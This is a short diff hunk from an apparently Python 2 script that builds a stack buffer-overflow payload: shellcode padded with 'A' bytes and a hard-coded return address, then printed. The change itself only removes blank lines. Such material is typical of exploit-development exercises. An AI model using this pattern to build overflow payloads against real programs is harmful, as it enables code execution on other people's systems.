@@ -10,6 +10,4 @@ exploit += b'A'*(80 - len(shellcode))
 
 exploit += struct.pack("I", 0xffffd6cc)
 
-
-
 print exploit
